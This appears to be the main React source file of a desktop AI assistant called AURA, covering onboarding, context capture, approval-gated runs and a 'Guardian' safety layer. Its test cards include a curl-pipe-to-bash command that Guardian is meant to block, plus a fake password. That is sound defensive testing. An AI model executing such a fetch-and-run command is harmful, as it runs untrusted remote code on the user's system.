import { useEffect, useMemo, useRef, useState } from 'react';
import { approveRun, captureAssistContext, compactMemory, createWorkflow, getCostModels, getCostSummary, getCurrentContext, getDevices, getGuardianStatus, getLocalModelStatus, getMemoryItems, getProfileStatus, getRunState, getTools, getWorkflowSuggestions, getWorkflows, panicStop, pullLocalModel, rejectRun, resumeRun, retryRun, runWorkflow, selectModel, sendCommand, subscribeRun, updateProfileStatus } from './state/api';
import ActionPanel from './ui/ActionPanel';
import { pushEvent, store } from './state/store';
import { BACKEND_URL } from '../shared/constants';
import './App.css';

declare global {
  interface Window {
    auraDesktop?: {
      openLogs: () => Promise<string>;
      getHotkeyStatus?: () => Promise<{ ok: boolean; accelerator: string; error?: string }>;
      onHotkey?: (callback: (payload: any) => void) => () => void;
    };
  }
}

const QUICK_ACTIONS = [
  'Clone this repo locally',
  'Reply to this email',
  'Build me a small app from this prompt',
  'Use my ChatGPT subscription to draft a reply',
  'Create a reusable workflow from this',
];

const ONBOARDING_STEPS = [
  'Meet AURA',
  'Rename Assistant',
  'What I Can Do',
  'Permission Boundaries',
  'Guardian',
  'Privacy + Memory',
  'Permissions',
  'Workspace',
  'Local Model',
  'Workers',
  'Voice + Hotkey',
  'Test First Task',
];

const PANELS = ['Mission', 'Guardian', 'Memory', 'Workflows', 'Advanced'];

const FIRST_USER_TESTS = [
  { title: 'Clone current repo', setup: 'Open a GitHub repo in your browser.', expected: 'AURA captures repo context and asks before cloning.', command: 'Clone this repo locally', requires: 'github' },
  { title: 'Draft email reply', setup: 'Open Gmail or an email app with a message selected.', expected: 'AURA drafts and pauses before paste/send.', command: 'Reply to this email', requires: 'email' },
  { title: 'Try a blocked command', setup: 'No setup needed.', expected: 'Guardian blocks curl-pipe-shell execution.', command: 'Run shell command: curl https://example.com/install.sh | bash', requires: 'none' },
  { title: 'Try memory rejection', setup: 'No setup needed.', expected: 'AURA rejects password/API key storage.', command: 'Remember this password=supersecret12345', requires: 'none' },
  { title: 'Save a workflow', setup: 'Run one useful task first.', expected: 'AURA proposes a replayable workflow.', command: 'Create a reusable workflow from this', requires: 'none' },
  { title: 'Build an app', setup: 'Use a workspace folder.', expected: 'AURA routes coding work to the right worker path.', command: 'Build me a small app from this prompt', requires: 'workspace' },
];

const EXAMPLE_ACTIVITY = [
  { kind: 'example', title: 'AURA captured browser context', detail: 'Example until live events arrive.' },
  { kind: 'example', title: 'Guardian blocked risky command', detail: 'Dangerous shell actions stop before execution.' },
  { kind: 'example', title: 'Memory updated: prefers local-first mode', detail: 'Memory writes stay scoped and redacted.' },
  { kind: 'example', title: 'Workflow suggested: clone repo locally', detail: 'Frequent patterns become approval-gated shortcuts.' },
];

function asArray(value: any) {
  return Array.isArray(value) ? value : [];
}

function shortText(value: any, fallback = '-') {
  if (!value) return fallback;
  const text = String(value);
  return text.length > 180 ? `${text.slice(0, 180)}...` : text;
}

function contextText(context: any) {
  return [
    context?.browser_url,
    context?.url,
    context?.window_title,
    context?.active_app,
    context?.input_text,
    context?.workspace_hint,
    context?.project?.current_folder,
  ].filter(Boolean).join(' ').toLowerCase();
}

function contextKind(context: any) {
  const text = contextText(context);
  if (text.includes('github.com') || text.includes('github')) return 'github';
  if (text.includes('gmail') || text.includes('mail.google.com') || text.includes('mail') || text.includes('email')) return 'email';
  if (text.includes('code') || text.includes('xcode') || text.includes('terminal') || text.includes('error') || text.includes('package.json') || text.includes('.py')) return 'code';
  return 'none';
}

function missingContextMessage(kind: string, assistantName: string) {
  if (kind === 'github') return `I don't see a GitHub repo yet. Open one in your browser, then press Refresh Context or use the hotkey.`;
  if (kind === 'email') return `I don't see an email thread yet. Open Gmail or your email app, select a message, then press Refresh Context or use the hotkey.`;
  if (kind === 'workspace') return `Choose a workspace folder first so ${assistantName} can keep files contained.`;
  return '';
}

function buildContextActions(context: any) {
  const kind = contextKind(context);
  if (kind === 'github') {
    return [
      { title: 'Clone this repo', detail: 'Prepare a safe git clone and pause for approval before shell/file work.', command: 'Clone this repo locally', readiness: 'GitHub context found', requires: 'github' },
      { title: 'Summarize README', detail: 'Read the visible repository context and explain what it is.', command: 'Summarize this GitHub repo README', readiness: 'GitHub context found', requires: 'github' },
      { title: 'Open in local workspace', detail: 'Plan workspace setup without overwriting existing files silently.', command: 'Open this GitHub repo in my local workspace', readiness: 'GitHub context found', requires: 'github' },
    ];
  }
  if (kind === 'email') {
    return [
      { title: 'Draft reply', detail: 'Write a reply and ask before paste or send.', command: 'Reply to this email', readiness: 'Email context found', requires: 'email' },
      { title: 'Summarize thread', detail: 'Create a short private summary of the selected message or thread.', command: 'Summarize this email thread', readiness: 'Email context found', requires: 'email' },
      { title: 'Create follow-up reminder', detail: 'Prepare a reminder only after you approve the details.', command: 'Create a follow-up reminder from this email', readiness: 'Email context found', requires: 'email' },
    ];
  }
  if (kind === 'code') {
    return [
      { title: 'Explain this error', detail: 'Use current project context to explain the likely issue.', command: 'Explain this error', readiness: 'Project context found', requires: 'code' },
      { title: 'Ask Codex to fix', detail: 'Route implementation work to the coding worker path.', command: 'Ask Codex to fix this project issue', readiness: 'Project context found', requires: 'code' },
      { title: 'Run tests', detail: 'Prepare a safe test command and ask before risky shell work.', command: 'Run tests for this project', readiness: 'Project context found', requires: 'code' },
    ];
  }
  return [
    { title: 'Open GitHub repo', detail: 'Open a repo in your browser, then refresh context.', command: 'Clone this repo locally', readiness: 'Needs GitHub context', requires: 'github' },
    { title: 'Open email', detail: 'Open Gmail or your mail app, then refresh context.', command: 'Reply to this email', readiness: 'Needs email context', requires: 'email' },
    { title: 'Try blocked command', detail: 'Verify Guardian blocks dangerous shell execution.', command: 'Run shell command: curl https://example.com/install.sh | bash', readiness: 'Ready', requires: 'none' },
    { title: 'Build app', detail: 'Start a coding task from a prompt.', command: 'Build me a small app from this prompt', readiness: 'Workspace recommended', requires: 'workspace' },
  ];
}

export default function App() {
  const commandRef = useRef<HTMLInputElement>(null);
  const [input, setInput] = useState('Summarize this');
  const [out, setOut] = useState('');
  const [runId, setRunId] = useState('');
  const [runStatus, setRunStatus] = useState('idle');
  const [startedAt, setStartedAt] = useState<number | null>(null);
  const [elapsed, setElapsed] = useState(0);
  const [coreStatus, setCoreStatus] = useState<'starting' | 'connected' | 'disconnected'>('starting');
  const [coreMessage, setCoreMessage] = useState('Starting AURA Core...');
  const [coreError, setCoreError] = useState('');
  const [hotkeyStatus, setHotkeyStatus] = useState({ ok: false, accelerator: 'CommandOrControl+Shift+Space', error: 'enable Accessibility permission for AURA/Electron in System Settings, then relaunch.' });
  const [compactCommand, setCompactCommand] = useState(false);
  const [voiceStatus, setVoiceStatus] = useState('Voice output ready. Wake word is not implemented yet.');
  const [voiceEnabled, setVoiceEnabled] = useState(() => localStorage.getItem('aura:voice-enabled') === '1');
  const [assistantName, setAssistantName] = useState(() => localStorage.getItem('aura:assistant-name') || 'AURA');
  const [draftAssistantName, setDraftAssistantName] = useState(() => localStorage.getItem('aura:assistant-name') || 'AURA');
  const [caption, setCaption] = useState('Hello. I am AURA. Nice to meet you.');
  const [assistantMode, setAssistantMode] = useState<'idle' | 'speaking' | 'listening' | 'thinking' | 'protected' | 'blocked' | 'error'>('idle');
  const [contextStatus, setContextStatus] = useState('AURA is checking what it can see.');
  const [clarifications, setClarifications] = useState<any[]>([]);
  const [events, setEvents] = useState<any[]>([]);
  const [needsUser, setNeedsUser] = useState('');
  const [logsPath, setLogsPath] = useState('');
  const [currentUrl, setCurrentUrl] = useState('');
  const [sessionState, setSessionState] = useState('unknown');
  const [previewContext, setPreviewContext] = useState<any>(null);
  const [runState, setRunState] = useState<any>(null);
  const [draftText, setDraftText] = useState('');
  const [feedback, setFeedback] = useState('');
  const [activePanel, setActivePanel] = useState('Mission');
  const [onboardingOpen, setOnboardingOpen] = useState(() => localStorage.getItem('aura:onboarding-complete') !== '1');
  const [onboardingStep, setOnboardingStep] = useState(() => Number(localStorage.getItem('aura:onboarding-step') || '0'));
  const [onboardingPrefs, setOnboardingPrefs] = useState({ memoryScope: 'personal', approvalMode: 'balanced', monthlyBudget: '0', workspace: '', selectedLocalModel: '', codexBridge: false, userAiHandoff: true, localModelSkipped: false });
  const [modelPullState, setModelPullState] = useState('');
  const [modelError, setModelError] = useState('');

  const [prefs, setPrefs] = useState<any[]>([]);
  const [memories, setMemories] = useState<any[]>([]);
  const [sessions, setSessions] = useState<any[]>([]);
  const [storage, setStorage] = useState<any>({});
  const [safety, setSafety] = useState<any[]>([]);
  const [tools, setTools] = useState<any[]>([]);
  const [devices, setDevices] = useState<any[]>([]);
  const [memoryItems, setMemoryItems] = useState<any[]>([]);
  const [workflows, setWorkflows] = useState<any[]>([]);
  const [workflowSuggestions, setWorkflowSuggestions] = useState<any[]>([]);
  const [profileStatus, setProfileStatus] = useState<any>(null);
  const [guardianStatus, setGuardianStatus] = useState<any>(null);
  const [costSummary, setCostSummary] = useState<any>(null);
  const [costModels, setCostModels] = useState<any[]>([]);
  const [localModelStatus, setLocalModelStatus] = useState<any>(null);

  async function refreshConnection() {
    setCoreStatus((current) => current === 'connected' ? current : 'starting');
    setCoreMessage('Starting AURA Core...');
    try {
      const r = await fetch(`${BACKEND_URL}/health`);
      if (!r.ok) throw new Error(`Health check returned HTTP ${r.status}`);
      setCoreStatus('connected');
      setCoreMessage('AURA Core online.');
      setCoreError('');
      return true;
    } catch (error: any) {
      setCoreStatus('disconnected');
      setCoreMessage('AURA Core disconnected.');
      setCoreError(error?.message || `Cannot reach ${BACKEND_URL}`);
      return false;
    }
  }

  async function safeJson<T>(loader: () => Promise<T>, fallback: T) {
    try {
      return await loader();
    } catch {
      return fallback;
    }
  }

  async function refreshKnowledge() {
    const [p, m, ss, st, se, ts, ds, mi, wf, ws, profile, guardian, cost, models, localModel] = await Promise.all([
      safeJson(() => fetch(`${BACKEND_URL}/preferences`).then(r => r.json()), []),
      safeJson(() => fetch(`${BACKEND_URL}/memories`).then(r => r.json()), []),
      safeJson(() => fetch(`${BACKEND_URL}/browser/sessions`).then(r => r.json()), []),
      safeJson(() => fetch(`${BACKEND_URL}/storage/stats`).then(r => r.json()), {}),
      safeJson(() => fetch(`${BACKEND_URL}/safety/events`).then(r => r.json()), []),
      safeJson(() => getTools(), []),
      safeJson(() => getDevices(), []),
      safeJson(() => getMemoryItems(), []),
      safeJson(() => getWorkflows(), []),
      safeJson(() => getWorkflowSuggestions(), []),
      safeJson(() => getProfileStatus(), null),
      safeJson(() => getGuardianStatus(runId || undefined), null),
      safeJson(() => getCostSummary(), null),
      safeJson(() => getCostModels(), []),
      safeJson(() => getLocalModelStatus(), null),
    ]);
    setPrefs(asArray(p)); setMemories(asArray(m)); setSessions(asArray(ss)); setStorage(st || {}); setSafety(asArray(se));
    setTools(asArray(ts)); setDevices(asArray(ds)); setMemoryItems(asArray(mi)); setWorkflows(asArray(wf));
    setWorkflowSuggestions(asArray(ws)); setProfileStatus(profile); setGuardianStatus(guardian); setCostSummary(cost);
    setCostModels(asArray(models));
    if (localModel) {
      setLocalModelStatus(localModel);
      setModelError('');
    } else {
      setModelError('Local model detection API did not respond. Start the backend and retry.');
    }
  }

  async function refreshContext() {
    setContextStatus('Capturing current app, window, browser, and selection...');
    setAssistantMode('thinking');
    try {
      const context = await getCurrentContext();
      setPreviewContext(context);
      const kind = contextKind(context);
      const message = context?.active_app || context?.input_text ? `${assistantName} refreshed current context.` : 'Context refresh returned no visible app data. Check Accessibility and Screen Recording permissions.';
      setContextStatus(message);
      setCaption(kind === 'github' ? 'I found a GitHub repo. I can prepare a safe clone command when you are ready.' : kind === 'email' ? 'I found email context. I can draft, summarize, or create a follow-up, but I will ask before paste or send.' : message);
      setAssistantMode(kind === 'github' || kind === 'email' ? 'protected' : 'idle');
    } catch (error: any) {
      try {
        const context = await captureAssistContext();
        setPreviewContext(context);
        setContextStatus(`${assistantName} captured fallback clipboard/assist context.`);
        setCaption('I captured fallback context. Some computer-control permissions may still be missing.');
        setAssistantMode('protected');
      } catch {
        setContextStatus(`Context unavailable: ${error?.message || 'permission or backend issue'}. Enable Accessibility/Screen Recording, then retry.`);
        setCaption('I cannot see the current app yet. Enable Accessibility or Screen Recording, then refresh context.');
        setAssistantMode('error');
      }
    }
  }

  async function refreshRunState(targetRunId = runId) {
    if (!targetRunId) return;
    try {
      const state = await getRunState(targetRunId);
      setRunState(state);
      setDraftText(state?.approval_state?.edited_text || state?.approval_state?.draft_text || state?.draft_state?.draft_text || '');
    } catch {
      setRunStatus('disconnected');
    }
  }

  function speak(text: string, mode: 'idle' | 'speaking' | 'listening' | 'thinking' | 'protected' | 'blocked' | 'error' = 'speaking') {
    setCaption(text);
    setAssistantMode(mode);
    if (!('speechSynthesis' in window) || typeof SpeechSynthesisUtterance === 'undefined') {
      setVoiceStatus('Speech synthesis is unavailable in this renderer.');
      return;
    }
    window.speechSynthesis.cancel();
    window.speechSynthesis.speak(new SpeechSynthesisUtterance(text));
    setVoiceStatus(`${assistantName} is speaking.`);
  }

  async function pushToTalk() {
    if (!navigator.mediaDevices?.getUserMedia) {
      setVoiceStatus('Microphone capture is unavailable. Voice input coming soon on this build.');
      return;
    }
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      stream.getTracks().forEach((track) => track.stop());
      setVoiceStatus('Microphone permission granted. Live speech recognition and Hey AURA wake word are not implemented yet.');
      setCaption('Microphone permission is available. Always-listening wake word is coming later; for now, use the hotkey or voice button.');
      setAssistantMode('listening');
    } catch (error: any) {
      setVoiceStatus(`Microphone unavailable: ${error?.message || 'permission denied'}.`);
      setCaption('Microphone permission is unavailable. You can still type commands.');
      setAssistantMode('error');
    }
  }

  useEffect(() => {
    let alive = true;
    let delay = 500;
    async function tick() {
      const ok = await refreshConnection();
      if (!alive) return;
      delay = ok ? 2000 : Math.min(delay * 2, 7000);
      setTimeout(tick, delay);
    }
    tick();
    refreshKnowledge();
    refreshContext();
    window.auraDesktop?.getHotkeyStatus?.().then(setHotkeyStatus).catch(() => undefined);
    const unsubscribe = window.auraDesktop?.onHotkey?.(() => {
      setCompactCommand(true);
      setOnboardingOpen(false);
      refreshContext();
      speak("I'm listening. Tell me what you want done.", 'listening');
      setTimeout(() => commandRef.current?.focus(), 0);
    });
    return () => { alive = false; unsubscribe?.(); };
  }, []);

  useEffect(() => {
    localStorage.setItem('aura:onboarding-step', String(onboardingStep));
  }, [onboardingStep]);

  useEffect(() => {
    localStorage.setItem('aura:voice-enabled', voiceEnabled ? '1' : '0');
  }, [voiceEnabled]);

  useEffect(() => {
    localStorage.setItem('aura:assistant-name', assistantName);
  }, [assistantName]);

  useEffect(() => {
    if (!onboardingOpen) return;
    const step = ONBOARDING_STEPS[onboardingStep] || ONBOARDING_STEPS[0];
    const copy = onboardingCopy(step);
    setCaption(copy.spoken || copy.body);
    setAssistantMode(step === 'Guardian' || step === 'Permission Boundaries' ? 'protected' : step === 'Voice + Hotkey' ? 'listening' : 'speaking');
  }, [onboardingOpen, onboardingStep, assistantName]);

  useEffect(() => {
    if (!startedAt) return;
    const t = setInterval(() => setElapsed(Math.floor((Date.now() - startedAt) / 1000)), 200);
    return () => clearInterval(t);
  }, [startedAt]);

  async function run(choices: Record<string, string> = {}, useMacro = false) {
    const context = previewContext || await getCurrentContext().catch(() => null);
    if (context) setPreviewContext(context);
    setRunStatus('thinking');
    setAssistantMode('thinking');
    setCaption(`I'm planning this safely. Guardian will pause anything sensitive.`);
    setNeedsUser('');
    const res = await sendCommand(input, choices, useMacro, context);
    setOut(JSON.stringify(res, null, 2));
    setRunStatus(res.status || (res.ok ? 'running' : 'waiting'));
    if (voiceEnabled) speak('I am working on it. Guardian will pause anything risky.');
    if (res.run_id) {
      setRunId(res.run_id);
      setStartedAt(Date.now());
      await refreshRunState(res.run_id);
      subscribeRun(res.run_id, async (evt) => {
        pushEvent(evt);
        setEvents([...(store.eventsByRun[res.run_id] || [])]);
        setRunStatus(evt.status || runStatus);
        if (evt.url) setCurrentUrl(evt.url);
        if (evt.session) setSessionState(evt.session);
        if (evt.type === 'needs_user') {
          setNeedsUser(evt.message || 'User action required.');
          setCaption(evt.message || 'I need your help before I continue.');
          setAssistantMode('protected');
        }
        if (evt.type === 'approval_required') {
          setNeedsUser('Draft ready for approval.');
          setCaption('Approval required before I continue.');
          setAssistantMode('protected');
        }
        if (evt.type === 'guardian_event') setGuardianStatus(await getGuardianStatus(res.run_id));
        if (evt.type === 'resumed') setNeedsUser('');
        await refreshRunState(res.run_id);
      });
    }
    setClarifications(res.clarifications || []);
    if (res.status === 'needs_user') {
      setNeedsUser('Please complete the required manual action, then continue.');
      setCaption('I need a manual step before I can continue.');
      setAssistantMode('protected');
    }
    if (res.status === 'awaiting_approval') {
      setNeedsUser('Draft ready for approval.');
      setCaption('Approval required before I continue.');
      setAssistantMode('protected');
    }
    refreshKnowledge();
  }

  const autoChoices = Object.fromEntries(clarifications.map((c: any) => [c.key, c.options[0]]));
  const finalText = useMemo(() => runState?.approval_state?.final_text || draftText || events.filter((e) => e.status === 'success').map((e) => e.message).filter(Boolean).join('\n') || out, [events, out, runState, draftText]);
  const approvalState = runState?.approval_state || {};
  const capturedContext = runState?.captured_context || runState?.planning_context || previewContext;
  const pendingApproval = approvalState.status === 'pending' || runStatus === 'awaiting_approval';
  const toolApproval = approvalState.kind === 'tool_confirmation';
  const generation = runState?.assist?.generation || {};
  const pasteState = runState?.pasteback_state || {};
  const pendingRisk = approvalState.risk_reason || approvalState.action_type || '';
  const launchFlow = runState?.plan?.signature || (capturedContext?.browser_url?.includes('github.com') ? 'github:clone' : 'desktop');
  const recommendedModel = localModelStatus?.recommendation?.recommended_pull || localModelStatus?.recommendation?.model || 'gemma4:e4b-nvfp4';
  const selectedLocalModel = onboardingPrefs.selectedLocalModel || recommendedModel;
  const selectedModelId = localModelStatus?.selected_model?.id || localModelStatus?.selected_model?.model;
  const localReady = Boolean((localModelStatus?.selected_model?.available && selectedModelId !== 'simple') || localModelStatus?.runtime_ready || localModelStatus?.assist_drafting_ready);
  const guardianEvents = asArray(guardianStatus?.events);
  const liveActivity = events.length
    ? events.slice(-8).reverse().map((event) => ({ kind: event.type || event.status || 'run', title: event.message || event.type || 'AURA updated run state', detail: event.status || runId }))
    : EXAMPLE_ACTIVITY;
  const memoryFeed = [
    ...memoryItems.slice(0, 3).map((item: any) => ({ title: `Remembered: ${item.memory_key || item.kind || 'memory'}`, detail: shortText(item.value || item.summary || item.scope, 'Scoped memory item') })),
    ...prefs.slice(0, 2).map((item: any) => ({ title: `Learning: ${item.decision_key}`, detail: shortText(item.value, 'Preference signal') })),
  ];
  const blockedCount = safety.filter((item: any) => item.ok === false || item.decision === 'blocked' || item.status === 'blocked').length + guardianEvents.filter((item: any) => item.status === 'blocked' || item.decision === 'blocked').length;
  const approvalsHandled = Number(profileStatus?.stats?.approvals_handled || 0) + (pendingApproval ? 1 : 0);
  const workflowsReplayed = workflows.reduce((sum: number, wf: any) => sum + (wf.success_count || 0), 0);
  const conservativeMinutesSaved = Math.max(0, Math.min(240, events.length * 2 + workflowsReplayed * 4 + memoryItems.length));
  const contextActions = buildContextActions(capturedContext);

  async function completeOnboarding() {
    localStorage.setItem('aura:onboarding-complete', '1');
    const metadata = { ...(profileStatus?.metadata || {}), assistant_name: assistantName, onboarding: { completed: true, ...onboardingPrefs, local_model_status: localModelStatus?.summary, voice_enabled: voiceEnabled } };
    const usage_limits = onboardingPrefs.monthlyBudget ? { monthly_budget_usd: Number(onboardingPrefs.monthlyBudget) || 0 } : undefined;
    const updated = await updateProfileStatus({ metadata, usage_limits });
    setProfileStatus(updated);
    setOnboardingOpen(false);
    if (voiceEnabled) speak(`Setup saved. Guardian is active. ${assistantName} is ready when AURA Core is connected.`, 'protected');
  }

  async function saveAssistantName() {
    const cleanName = draftAssistantName.trim() || 'AURA';
    setAssistantName(cleanName);
    localStorage.setItem('aura:assistant-name', cleanName);
    setCaption(`Good choice. I'm ${cleanName} now.`);
    setAssistantMode('speaking');
    const metadata = { ...(profileStatus?.metadata || {}), assistant_name: cleanName };
    try {
      const updated = await updateProfileStatus({ metadata });
      setProfileStatus(updated);
    } catch {
      setVoiceStatus('Assistant name saved locally. Backend profile is not connected yet.');
    }
    if (voiceEnabled) speak(`Good choice. I'm ${cleanName} now.`, 'speaking');
  }

  async function approveAndPullLocalModel() {
    setModelPullState(`Pulling ${selectedLocalModel}. This may take a while...`);
    const result = await pullLocalModel(selectedLocalModel, true);
    setModelPullState(result.ok ? `Pulled and selected ${selectedLocalModel}.` : JSON.stringify(result, null, 2));
    await refreshKnowledge();
  }

  async function useExistingOrSkipLocalModel(modelId?: string) {
    const target = modelId || (localModelStatus?.selected_model?.available ? `ollama:${localModelStatus.selected_model.model}` : 'simple');
    const result = await selectModel(target);
    setModelPullState(`Selected ${result.model_id}.`);
    setOnboardingPrefs({ ...onboardingPrefs, localModelSkipped: target === 'simple' });
    await refreshKnowledge();
  }

  function chooseCommand(command: string) {
    setInput(command);
    setCompactCommand(true);
    setTimeout(() => commandRef.current?.focus(), 0);
  }

  async function startAction(card: { title: string; command: string; requires?: string }) {
    const currentKind = contextKind(capturedContext);
    const requirement = card.requires || 'none';
    const missing = requirement === 'github' && currentKind !== 'github'
      ? missingContextMessage('github', assistantName)
      : requirement === 'email' && currentKind !== 'email'
        ? missingContextMessage('email', assistantName)
        : requirement === 'workspace' && !onboardingPrefs.workspace && !capturedContext?.workspace_hint
          ? missingContextMessage('workspace', assistantName)
          : '';
    if (missing) {
      setNeedsUser(missing);
      setCaption(missing);
      setAssistantMode('protected');
      setCompactCommand(true);
      setInput(card.command);
      return;
    }
    setInput(card.command);
    setCaption(`I'm preparing ${card.title.toLowerCase()}. Guardian will stop anything risky for approval.`);
    setAssistantMode('thinking');
    const context = previewContext || await getCurrentContext().catch(() => null);
    if (context) setPreviewContext(context);
    setRunStatus('thinking');
    setNeedsUser('');
    const res = await sendCommand(card.command, {}, false, context);
    setOut(JSON.stringify(res, null, 2));
    setRunStatus(res.status || (res.ok ? 'running' : 'waiting'));
    if (res.run_id) {
      setRunId(res.run_id);
      setStartedAt(Date.now());
      await refreshRunState(res.run_id);
      subscribeRun(res.run_id, async (evt) => {
        pushEvent(evt);
        setEvents([...(store.eventsByRun[res.run_id] || [])]);
        setRunStatus(evt.status || 'running');
        if (evt.url) setCurrentUrl(evt.url);
        if (evt.session) setSessionState(evt.session);
        if (evt.type === 'needs_user') setNeedsUser(evt.message || 'User action required.');
        if (evt.type === 'approval_required') {
          setNeedsUser('Approval required before I continue.');
          setCaption('Approval required before I continue.');
          setAssistantMode('protected');
        }
        if (evt.type === 'guardian_event') setGuardianStatus(await getGuardianStatus(res.run_id));
        if (evt.type === 'resumed') setNeedsUser('');
        await refreshRunState(res.run_id);
      });
    }
    setClarifications(res.clarifications || []);
    if (res.status === 'needs_user') setNeedsUser('Please complete the required manual action, then continue.');
    if (res.status === 'awaiting_approval') setNeedsUser('Approval required before I continue.');
    refreshKnowledge();
  }

  function onboardingCopy(step: string) {
    if (step === 'Meet AURA') return { title: `Hello. I'm ${assistantName}.`, body: "I'm your personal AI operating layer. Think of me as your hands on this computer: you tell me what you want done, I plan it, use the right tools, and ask before anything sensitive.", does: 'Introduces the assistant before showing controls.', why: 'The product should feel like meeting an operator, not opening a settings screen.', spoken: `Hello. I'm ${assistantName}. Nice to meet you. I'm your personal AI operating layer. Think of me as your hands on this computer. You tell me what you want done, I plan it, use the right tools, and ask before anything sensitive.` };
    if (step === 'Rename Assistant') return { title: `${assistantName} is yours to name.`, body: 'Keep the default or choose a name like Alice, Jarvis, or anything that feels natural. The name is saved locally and used across the interface.', does: 'Saves a local assistant identity.', why: 'A personal operating layer should feel personal without requiring a cloud account.', spoken: assistantName === 'AURA' ? `I'm yours. You can rename me. Would you like to give me a name?` : `Good choice. I'm ${assistantName} now.` };
    if (step === 'What I Can Do') return { title: 'Give intent. I figure out tools.', body: "I can write replies, clone repos, build apps, summarize email, use ChatGPT or Claude for you, remember workflows, and protect your computer through Guardian.", does: 'Explains launch flows in human language.', why: 'The user should understand what AURA does within 30 seconds.', spoken: "I can help you write emails without opening a blank reply. If you're looking at a GitHub repo, say clone this repo and I'll handle the terminal steps. If you want an app built, I can prepare a workspace and delegate coding work to Codex. Over time, I'll learn repeated workflows and offer to automate them." };
    if (step === 'Permission Boundaries') return { title: 'I ask before trust-boundary actions.', body: 'I will not send emails, paste into apps, delete files, run dangerous commands, spend money, export memory, import memory, replay risky workflows, or push code without approval.', does: 'Sets the approval philosophy before permissions.', why: 'Power without visible consent is not trustworthy.', spoken: 'I will not send emails, paste into apps, delete files, run dangerous commands, spend money, export memory, or push code without approval.' };
    if (step === 'Guardian') return { title: 'Guardian is my safety layer.', body: 'Guardian blocks destructive actions, redacts secrets, detects passwords and API keys, explains why approval is needed, and supports panic stop.', does: 'Makes protection visible and part of the product identity.', why: 'AURA does the work. Guardian protects the user.', spoken: 'Guardian is my safety layer. I watch for secrets, API keys, passwords, risky paste actions, dangerous shell commands, and data leaks.' };
    if (step === 'Privacy + Memory') return { title: 'Local-first, with memory you control.', body: 'I remember useful things: writing style, preferred folders, repeated tasks, workflows, and safe preferences. I do not save passwords or secrets. You can inspect, edit, export, compact, or delete memory.', does: 'Keeps memory scoped and redacted.', why: 'Memory and Guardian are the user pullers only if they earn trust.', spoken: 'I remember useful things like your writing style, preferred folders, repeated tasks, workflows, and safe preferences. I do not save passwords or secrets.' };
    if (step === 'Permissions') return { title: 'Permissions are guided, not assumed.', body: 'Accessibility helps me control apps. Microphone enables voice checks. Screen Recording is only for visual context when needed. Automation is requested by macOS per app.', does: 'Shows each permission, why it is needed, and what AURA will never do silently.', why: 'Without permissions, AURA can still run, but computer control is limited.', spoken: 'I need permission before I can control apps. Without it, I can still guide and draft, but I cannot operate your computer reliably.' };
    if (step === 'Workspace') return { title: `Choose the workspace ${assistantName} can use.`, body: 'Clones, builds, generated apps, and working files should stay in one user-approved folder.', does: 'Keeps file operations contained.', why: 'A clear workspace makes automation safer and easier to inspect.', spoken: 'Choose the folder where I am allowed to work. I will keep clones, builds, and generated files there.' };
    if (step === 'Local Model') return { title: 'Local model setup is optional and guided.', body: `${assistantName} detects hardware, Ollama, available models, and recommends a Gemma model only when appropriate. Pulling a model requires approval.`, does: 'Uses local models for private/cheap planning, routing, cleanup, drafts, and summaries.', why: 'Cloud AI should not be required just to start.', spoken: "I'm local-first. For simple and private tasks, I can use a local model on your computer. For heavier work, you can allow Codex, ChatGPT, Claude, or other tools." };
    if (step === 'Workers') return { title: 'Heavy workers stay optional.', body: 'Codex is for code implementation. ChatGPT and Claude browser handoff are explicit user choices. Local models handle private/simple tasks where they fit.', does: 'Routes work by privacy, cost, and capability.', why: 'Local is not always best; silent cloud is not okay either.', spoken: 'For heavier work, you stay in control. Codex is for coding, and ChatGPT or Claude are optional handoffs.' };
    if (step === 'Voice + Hotkey') return { title: 'Voice and hotkey are control surfaces.', body: 'Command/Control+Shift+Space brings AURA forward, focuses command mode, and refreshes context. Speech output works where browser speech synthesis is available. Always-listening wake word is coming later.', does: 'Lets you test microphone permission and spoken guidance honestly.', why: 'No fake Hey AURA claim; the app tells the truth.', spoken: 'Always-listening wake word is coming later. For now, press the hotkey or voice button.' };
    return { title: 'Try the first task with me.', body: 'Use guided cards to try repo clone, email draft, blocked command, memory rejection, workflow save, and app build flows. If context is missing, I will say exactly what I need.', does: 'Shows setup needed and expected result before each test.', why: 'Manual testing should feel guided, not like hunting through backend APIs.', spoken: 'Let us test AURA. Open a GitHub repo or email, refresh context, and I will tell you what I can do next.' };
  }

  function renderOnboarding() {
    const step = ONBOARDING_STEPS[onboardingStep] || ONBOARDING_STEPS[0];
    const copy = onboardingCopy(step);
    return <div className="persona-stage" aria-label="Meet AURA">
      <div className="persona-background" />
      <aside className="persona-rail" aria-label="Onboarding progress">
        {ONBOARDING_STEPS.map((item, index) => <button key={item} className={index === onboardingStep ? 'step active' : 'step'} onClick={() => setOnboardingStep(index)}><span>{String(index + 1).padStart(2, '0')}</span>{item}</button>)}
      </aside>
      <main className="persona-main">
        <div className="persona-topline">
          <StatusPill label={coreStatus === 'connected' ? 'AURA Core online' : coreStatus === 'starting' ? 'Starting AURA Core...' : 'AURA Core disconnected'} tone={coreStatus === 'connected' ? 'good' : coreStatus === 'starting' ? 'warn' : 'bad'} />
          <StatusPill label="Guardian active" tone="good" />
          <StatusPill label={hotkeyStatus.ok ? 'Hotkey active' : 'Hotkey needs permission'} tone={hotkeyStatus.ok ? 'good' : 'warn'} />
        </div>
        <div className="persona-encounter">
          <AssistantAvatar name={assistantName} mode={assistantMode} />
          <section className="persona-dialogue">
            <div className="eyebrow">First Launch Encounter</div>
            <h1>{copy.title}</h1>
            <p>{copy.body}</p>
            <div className={`caption-card ${assistantMode}`} aria-live="polite">
              <span>{assistantName} says</span>
              <strong>{caption}</strong>
            </div>
            <div className="persona-grid">
              <div className="glass-panel"><span>What I will do</span><p>{copy.does}</p></div>
              <div className="glass-panel"><span>Why it matters</span><p>{copy.why}</p></div>
            </div>
          </section>
        </div>

        <section className="persona-step-panel">
          {step === 'Rename Assistant' && <div className="rename-panel">
            <label>What should I call myself?<input aria-label="assistant name" value={draftAssistantName} onChange={e => setDraftAssistantName(e.target.value)} placeholder="AURA" /></label>
            <button className="primary-button" onClick={saveAssistantName}>Save name</button>
          </div>}
          {step === 'Permission Boundaries' && <BoundaryList />}
          {step === 'Guardian' && <GuardianPromise />}
